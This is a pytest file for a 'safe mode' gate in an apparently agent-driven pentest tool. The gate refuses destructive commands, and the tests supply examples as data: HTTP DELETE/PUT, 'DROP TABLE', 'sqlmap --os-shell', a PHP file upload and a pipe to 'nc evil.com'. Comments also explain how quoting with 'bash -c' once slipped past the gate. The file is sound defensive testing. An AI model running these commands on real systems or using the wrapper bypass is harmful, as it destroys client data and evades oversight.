"""Safe mode: refuse destructive actions against an IN-SCOPE host.

The scope guard answers "may I touch this host?" and says nothing about whether
an action is destructive, so an in-scope `curl -X DELETE /api/Users/1` was
always permitted. On a client engagement that is an incident.

THE LOAD-BEARING FIX HERE IS NOT THE DENYLIST — it is the detection guard.
main.py sets `raw_output = result.get("output") or result.get("error")` and then
runs the deterministic detectors over it, so a REFUSAL string became detection
input. Verified live against the pre-fix code:

    scope-refused `curl -s -i http://evil.com/`
        -> MEDIUM Security Misconfiguration ("every header missing")
    scope-refused `curl -s -i http://evil.com/%00`
        -> HIGH Sensitive Data Exposure

Both from requests that were never sent. Safe mode would have multiplied this,
because it refuses exactly the `curl -s -i -X DELETE` shapes those rules match.
"""

import importlib
import os
import re
import pathlib
import sqlite3

import pytest
import yaml

import orchestrator.tool_executor as T
from orchestrator.detection import auto_detect_findings

from tests import corpus  # noqa: E402


@pytest.fixture(autouse=True)
def _safe_on(monkeypatch):
    monkeypatch.setenv("ERLIK_SAFE_MODE", "1")
    monkeypatch.delenv("ERLIK_SCOPE_ENFORCE", raising=False)


class TestRefusalNeverBecomesAFinding:
    """The guard. Each string below is a real `result['error']` value."""

    @pytest.mark.parametrize("err", [
        "SCOPE: out-of-scope host 'evil.com' (target 'juice-shop')",
        "TOOLSET: command segment runs 'nc', which is not in this session's toolset",
        "SAFE_MODE: HTTP write verb (DELETE/PUT/PATCH) [http-write-verb].",
        "kali-tools container is not running.",
        "Tool 'nmap' is not enabled for this session",
    ])
    @pytest.mark.parametrize("cmd", [
        "curl -s -i http://juice-shop:3000/",
        "curl -s -i -X DELETE http://juice-shop:3000/api/Users/1",
        "curl -s -i http://juice-shop:3000/x%00",
    ])
    def test_guarded_call_site_yields_nothing(self, err, cmd):
        """Reproduces main.py's fallback and its guard, exactly as written.

        `raw_output = result.get("output") or result.get("error") or "No output"`
        then
        `auto_findings = _auto_detect_findings(...) if result.get("executed", True) else []`
        """
        result = {"success": False, "output": "", "error": err, "executed": False}
        raw_output = result.get("output") or result.get("error") or "No output"
        auto_findings = (auto_detect_findings("curl", raw_output, cmd)
                         if result.get("executed", True) else [])
        assert auto_findings == []

    def test_a_real_execution_still_detects(self):
        """The guard must not suppress findings from commands that DID run —
        otherwise it would trade phantom findings for missed ones."""
        real = ("HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\n"
                "Access-Control-Allow-Credentials: true\r\n\r\n")
        result = {"success": True, "output": real, "error": None, "executed": True}
        raw_output = result.get("output") or result.get("error") or "No output"
        auto_findings = (auto_detect_findings("curl", raw_output,
                                              "curl -s -i http://juice-shop:3000/")
                         if result.get("executed", True) else [])
        assert auto_findings, "guard suppressed a genuine detection"

    def test_detectors_would_have_fired_without_the_guard(self):
        """Proves the guard is load-bearing rather than defensive decoration.

        If this ever returns [], the guard has become untestable and the
        control above is vacuous — that is worth failing over.
        """
        err = "SCOPE: out-of-scope host 'evil.com' (target 'juice-shop')"
        phantom = auto_detect_findings("curl", err, "curl -s -i http://evil.com/")
        assert phantom, "detectors no longer fire on a refusal string"
        assert any(f["vuln_type"] == "Security Misconfiguration" for f in phantom)

    @pytest.mark.parametrize("cmd,label", [
        ("curl -s -i -X DELETE http://juice-shop:3000/api/Users/1", "safe-mode"),
        ("curl -s -i http://evil.com/", "scope"),
        ("curl -s -i http://juice-shop:3000/ | nc evil.com 443", "toolset"),
    ])
    def test_refusal_is_marked_not_executed(self, cmd, label):
        """The contract main.py's guard depends on."""
        import asyncio
        r = asyncio.run(T.execute_tool(cmd, ["curl"], target_url="http://juice-shop:3000"))
        assert r.get("executed") is False, f"{label} refusal not marked"
        assert r["output"] == ""


class TestDestructiveActionsRefused:
    @pytest.mark.parametrize("cmd,rule", [
        ("curl -s -X DELETE http://juice-shop:3000/api/Users/1", "http-write-verb"),
        ("curl -X PUT --data x http://juice-shop:3000/f.txt", "http-write-verb"),
        ('curl -s --request PATCH -d "{}" http://juice-shop:3000/api/u/1', "http-write-verb"),
        ('curl -d "q=DROP TABLE users" http://juice-shop:3000/s', "sql-ddl-dml"),
        ("sqlmap -u http://juice-shop:3000/s?q=1 --os-shell", "sqlmap-os-takeover"),
        ("sqlmap -u http://juice-shop:3000/s?q=1 --file-write /tmp/a --file-dest /var/www/a",
         "sqlmap-os-takeover"),
        ("sqlmap -u http://juice-shop:3000/s?q=1 --batch --level=3 --risk=3", "sqlmap-max-risk"),
    ])
    def test_denied(self, cmd, rule):
        reason = T._safe_mode_violation(cmd)
        assert reason is not None, f"{cmd!r} was allowed"
        assert rule in reason

    @pytest.mark.parametrize("cmd", [
        "curl http://juice-shop:3000/s?q=1;DELETE+FROM+users",
        "curl 'http://juice-shop:3000/s?q=1;DROP%20TABLE%20users'",
        "curl 'http://juice-shop:3000/s?q=1%09DELETE%09FROM%09x'",
    ])
    def test_url_encoded_forms_are_denied_too(self, cmd):
        """A rule written as `DROP\\s+TABLE` denies the literal-space form while
        PASSING the percent/plus-encoded shape an agent actually emits — the
        gate would look present and do nothing on the payloads that matter."""
        assert T._safe_mode_violation(cmd) is not None


class TestLegitimateWorkStillRuns:
    @pytest.mark.parametrize("cmd", [
        "curl -s -i http://juice-shop:3000/",
        "curl -s -X POST -d 'email=a&password=b' http://juice-shop:3000/rest/user/login",
        "sqlmap -u http://juice-shop:3000/s?q=1 --batch --technique BEUST",
        "sqlmap -u http://juice-shop:3000/s?q=1 --batch --level=3 --risk=2",
        "sqlmap -u http://juice-shop:3000/s?q=1 --batch --dump",
        "nmap -sV juice-shop -p 3000",
        "ffuf -w /usr/share/wordlists/common.txt -u http://juice-shop:3000/FUZZ",
        "gobuster dir -u http://juice-shop:3000 -w /w.txt --exclude-length 3748",
    ])
    def test_allowed(self, cmd):
        assert T._safe_mode_violation(cmd) is None

    def test_technique_is_not_a_rule(self):
        """`--technique[= ]\\S*S` would deny sqlmap's own default BEUSTQ and the
        literal command in tests_catalog/wstg/INPV-05_sqli.yaml, gutting the
        smallest and highest-value finding class in the corpus (5 of 216)."""
        for t in ("BEUST", "BEUSTQ", "S"):
            assert T._safe_mode_violation(
                f"sqlmap -u http://t/?q=1 --batch --technique {t}") is None

    def test_dump_is_a_read(self):
        """--dump is how the agent EVIDENCES SQLi. Mass exfiltration is a
        data-handling concern, not a destructive-verb one."""
        assert T._safe_mode_violation("sqlmap -u http://t/?q=1 --dump-all") is None

    def test_disabled_by_env(self, monkeypatch):
        """Proves these tests read live state rather than asserting a constant."""
        cmd = "curl -X DELETE http://juice-shop:3000/api/Users/1"
        assert T._safe_mode_violation(cmd) is not None
        monkeypatch.setenv("ERLIK_SAFE_MODE", "0")
        assert T._safe_mode_violation(cmd) is None


class TestAgainstRealCommandCorpora:
    """Negative controls driven from real command sources, never hand-retyped.

    A control quoting an excerpt of a test-case command goes green while the
    real step is denied, because the destructive flag is on a line the excerpt
    omitted.
    """

    def test_historical_commands_denied_set_is_exactly_known(self):
        db = pathlib.Path(__file__).resolve().parents[1] / "data" / "pentest.db"
        if not db.exists():
            pytest.skip("no recorded corpus")
        corpus.require("steps")
        rows = [r[0] for r in sqlite3.connect(f"file:{db}?mode=ro", uri=True).execute(
            "SELECT tool_input FROM steps WHERE tool_input IS NOT NULL AND tool_input != ''")]
        denied = [c for c in rows if T._safe_mode_violation(c)]
        # NOT an exact count: the corpus grows with every recorded run, so a
        # pinned number fails on the next experiment instead of on a regression.
        #
        # The invariant is the SHAPE — every denial in real traffic is the same
        # sqlmap --risk=3 form — plus a rate ceiling, since a broadened rule
        # would refuse a large fraction of ordinary commands rather than one
        # more.
        assert all("--risk=3" in c for c in denied), \
            [c[:90] for c in denied if "--risk=3" not in c]
        rate = len(denied) / len(rows)
        assert rate < 0.05, f"{rate:.1%} of recorded commands denied ({len(denied)}/{len(rows)})"

    def test_wstg_denied_set_is_exactly_known(self):
        root = pathlib.Path(__file__).resolve().parents[1] / "tests_catalog" / "wstg"
        denied = []
        for p in sorted(root.glob("*.yaml")):
            doc = yaml.safe_load(p.read_text()) or {}
            for st in doc.get("steps", []) or []:
                cmd = st.get("command") or ""
                if cmd and T._safe_mode_violation(cmd):
                    denied.append((p.name, st.get("name")))
        # CONF-06's put_probe writes a file to the target. Denying it is correct: the case
        # still detects the issue from its OPTIONS step and reports at medium rather than
        # confirming at high by writing to a client server.
        #
        # BUSL-09's THREE UPLOAD STEPS JOINED IT, and the reason they were missing is the
        # defect this list now guards. Every conjunction rule opened with
        # `(?:^|\s)curl(?:\s|$)`, and a quote is not whitespace — so
        # `bash -c 'curl ...'`, which nine catalogue files use because a step needing a pipe
        # or a shell variable must, was not recognised as a curl at all. Measured through
        # `_safe_mode_violation` itself: `curl -X DELETE` DENIED,
        # `bash -c 'curl -X DELETE'` ALLOWED — the same request. BUSL-09 posts a file with
        # `-F "param=@-;filename=erlik-upload-canary.php"` inside exactly that wrapper, and
        # POST was additionally not a write verb, so it was refused nowhere.
        #
        # Denying it is right for the same reason as put_probe, and more so: NO catalogue
        # case has a cleanup step — `TestCase` and `TestStep` have no such field at either
        # level — and BUSL-09's own header tells a human to run
        # `find / -name 'erlik-upload-*'` afterwards. Running it needs ERLIK_SAFE_MODE=0,
        # which `runconfig` guards behind a `safe_mode_ack` naming the engagement. That is
        # the authorisation model working, not a capability lost.
        #
        # Any OTHER denial is a regression.
        assert denied == [
            ("BUSL-09_file_upload.yaml", "double_extension_upload"),
            ("BUSL-09_file_upload.yaml", "content_type_spoof_upload"),
            ("BUSL-09_file_upload.yaml", "rejection_names_the_allowlist"),
            ("CONF-06_http_methods.yaml", "put_probe")], denied

    def test_playbook_write_verb_is_the_only_denial(self):
        src = (pathlib.Path(__file__).resolve().parents[1]
               / "orchestrator" / "playbooks.py").read_text()
        cmds = re.findall(
            r'((?:curl|sqlmap|ffuf|nmap|gobuster|nuclei|hydra|jwt_tool)\s[^\n"\']{6,200})',
            src)
        denied = [c for c in cmds if T._safe_mode_violation(c)]
        assert all("-X PUT" in c or "-X DELETE" in c for c in denied), denied


class TestAShellWrapperIsStillACommand:
    """Safe mode's conjunction rules were bypassed by a quote.

    Every rule of the form "is a curl AND names a write verb" opened with
    `(?:^|\s)curl(?:\s|$)`, and a quote is not whitespace. Measured through
    `_safe_mode_violation` itself, before the fix:

        curl -X DELETE http://t/a              DENIED
        bash -c 'curl -X DELETE http://t/a'    ALLOWED       <- the same request

    That is not an exotic spelling. Nine catalogue files wrap curl in `bash -c '...'`,
    because a step that needs a pipe or a shell variable has to — including all three of
    WSTG-BUSL-09's file-upload steps, which were refused nowhere: POST is deliberately not a
    write verb, and the wrapper hid the client.
    """

    WRAPPED = [
        ("bash -c 'curl -X DELETE http://t/a'", "a shell-quoted DELETE"),
        ('sh -c "curl -X PUT --data x http://t/a"', "a double-quoted PUT"),
        ("printf x | curl -X PATCH http://t/a", "piped into curl"),
        ("(curl -X DELETE http://t/a)", "a subshell"),
        ("true; curl -X DELETE http://t/a", "after a semicolon"),
        ("sh -c 'sqlmap -u http://t/ --os-shell'", "sqlmap takeover, wrapped"),
        ("sh -c 'sqlmap -u http://t/ --risk=3'", "sqlmap risk 3, wrapped"),
    ]

    @pytest.mark.parametrize("command,why", WRAPPED)
    def test_a_wrapped_destructive_command_is_still_denied(self, command, why):
        assert T._safe_mode_violation(command, enabled=True), why

    def test_the_bare_form_was_always_denied(self):
        """The positive control: if this ever fails the rules themselves are broken, and
        every assertion above would pass for the wrong reason."""
        assert T._safe_mode_violation("curl -X DELETE http://t/a", enabled=True)

    @pytest.mark.parametrize("command,why", [
        ("curl -s -i http://t/", "a plain GET"),
        ("bash -c 'curl -s -i -X POST -d user=a http://t/login'", "a login POST"),
        ("bash -c 'curl -s -F \"name=value\" http://t/u'", "a form field that is not a file"),
        ("mycurl -X DELETE http://t/a", "a different tool whose name ends in curl"),
    ])
    def test_the_boundary_did_not_become_a_substring_match(self, command, why):
        assert T._safe_mode_violation(command, enabled=True) is None, why

    def test_an_upload_is_a_write_even_though_post_is_not(self):
        """POST stays allowed on purpose — a login and a search are both POSTs — but `-F`
        with an `@` and `-T` are unambiguous, and no test case has a cleanup step that could
        remove what they leave behind."""
        upload = 'bash -c \'curl -F "f=@-;filename=erlik-upload-canary.php" http://t/u\''
        why = T._safe_mode_violation(upload, enabled=True)
        assert why and "http-file-upload" in why
        assert T._safe_mode_violation("curl -T ./p.txt http://t/u", enabled=True)
        assert T._safe_mode_violation(
            "bash -c 'curl -X POST -d q=1 http://t/search'", enabled=True) is None

    def test_safe_mode_off_still_allows_everything(self):
        """The gate is the authorisation model, not a ban: these run with
        ERLIK_SAFE_MODE=0, which `runconfig` guards behind a `safe_mode_ack`."""
        for command, _ in self.WRAPPED:
            assert T._safe_mode_violation(command, enabled=False) is None

    def test_the_over_denial_this_buys_and_why_it_is_the_right_way_round(self):
        """A MENTION inside quotes is now refused too, and that is a real cost.

            echo 'curl -X DELETE http://t/a' > notes.txt     ->  denied

        Telling that apart from `bash -c 'curl -X DELETE ...'` needs shell parsing, and the
        two failure directions are not symmetric: an over-denial refuses a command that
        writes nothing and names the rule that fired, so the operator rewrites it or
        authorises the engagement; an under-denial sends a DELETE to a client's system. Safe
        mode errs toward refusing.

        Asserted rather than left out, so nobody reads the boundary as exact.
        """
        why = T._safe_mode_violation("echo 'curl -X DELETE http://t/a' > notes.txt",
                                     enabled=True)
        assert why and "http-write-verb" in why, (
            "the known over-denial changed shape; if it has been narrowed, check that "
            "bash -c 'curl -X DELETE' is still denied")
